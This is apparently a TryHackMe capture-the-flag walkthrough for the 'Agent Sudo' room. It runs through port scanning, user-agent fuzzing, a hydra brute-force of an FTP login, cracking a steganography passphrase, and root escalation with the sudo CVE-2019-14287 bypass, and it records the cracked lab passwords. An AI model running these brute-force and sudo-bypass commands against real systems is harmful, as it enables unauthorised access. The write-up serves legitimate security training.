---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Brute-Force
  - Stego
  - Sudo
---
https://tryhackme.com/room/agentsudoctf/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.222.155 agentsudo.thm
```
# Scanning
```console
$ nmap -p21,22,80 -sV -sC agentsudo.thm

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is a plain text message:
```console
$ curl -s 'http://agentsudo.thm/' | html2text --ignore-emphasis

Dear agents,  
  
Use your own codename as user-agent to access the site.  
  
From,  
Agent R
```
Perhaps, the **codename** refers to the initial of each agent, such as **Agent R**.
# Enumeration
Found **Agent C**:
```console
$ gobuster fuzz -q -r -H 'User-Agent: FUZZ' -w /usr/share/seclists/Fuzzing/alphanum-case.txt -u 'http://agentsudo.thm/' --exclude-length 218

Found: [Status=200] [Length=177] [Word=C] http://agentsudo.thm/
Found: [Status=200] [Length=310] [Word=R] http://agentsudo.thm/
```
**Agent C (chris)** has a weak password:
```console
$ curl -s -L -H 'User-Agent: C' 'http://agentsudo.thm/' | html2text

Attention chris,  
  
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!  
  
From,  
Agent R
```
Crack FTP password for **chris**:
```console
$ hydra -l chris -P /usr/share/dict/rockyou.txt ftp://agentsudo.thm

[21][ftp] host: agentsudo.thm   login: chris   password: crystal
```
# Steganography
Connect to FTP as **chris**:
```bash
ftp -i chris@agentsudo.thm
```
Download every file inside the FTP server:
```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.

ftp> mget *

ftp> quit
221 Goodbye.
```
The file `To_agentJ.txt` reveals that the **password** for **Agent J** is hidden inside the images:
```console
$ cat To_agentJ.txt

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
[Steghide](https://steghide.sourceforge.net/) tool was used to hide data inside `cute-alien.jpg` since it asks for a password. The data is protected by a **secret passphrase**:
```console
$ steghide extract -sf cute-alien.jpg

Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Extract hidden data by brute-forcing the **passphrase**:
```console
$ stegseek --crack cute-alien.jpg /usr/share/dict/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
```
Found **password** for **Agent J (james)**:
```console
$ cat cute-alien.jpg.out

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Since **Agent R** is behind everything, we can guess that he is **root**.
# Exploitation
Connect via SSH as **james**:
```bash
ssh james@agentsudo.thm
```
Get the **user flag**:
```bash
cat /home/james/user_flag.txt
```
# Post-Exploitation
User **james** can run `/bin/bash` as any user, except **root**:
```console
$ sudo -l

Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
The `sudo` version is vulnerable to [CVE-2019-14287](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/):
```console
$ sudo -V

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
Spawn a **root** shell:
```console
$ sudo -u#-1 /bin/bash

# whoami
root
```
Get the **root flag**:
```bash
cat /root/root.txt
```